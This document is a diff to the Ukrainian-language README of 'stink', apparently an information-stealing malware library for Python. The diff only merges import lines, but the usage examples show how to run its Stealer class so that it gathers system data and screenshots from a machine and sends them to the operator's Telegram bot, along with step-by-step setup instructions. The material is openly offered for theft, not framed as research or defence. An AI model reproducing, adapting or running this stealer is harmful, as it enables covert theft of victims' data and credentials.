@@ -53,8 +53,7 @@
 ## Приклад використання
 ### Стандартний
 ```python
-from stink import Stealer
-from stink.enums import Senders
+from stink import Stealer, Senders
 
 if __name__ == '__main__':
     Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
@@ -63,8 +62,7 @@ if __name__ == '__main__':
 
 Приклад зі збором тільки системних даних і скріншота.
 ```python
-from stink import Stealer
-from stink.enums import Features, Senders
+from stink import Stealer, Features, Senders
 
 if __name__ == '__main__':
     Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
@@ -126,8 +124,7 @@ Python являється інтерпретованою мовою програ
 2. Розпаковуємо архів і переходимо в директорію stink-master.
 3. Створюємо test.py (або будь-яку іншу назву) файл в цій же директорії з наступним кодом:
 ```python
-from stink import Stealer
-from stink.enums import Senders
+from stink import Stealer, Senders
 
 if __name__ == '__main__':
     Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
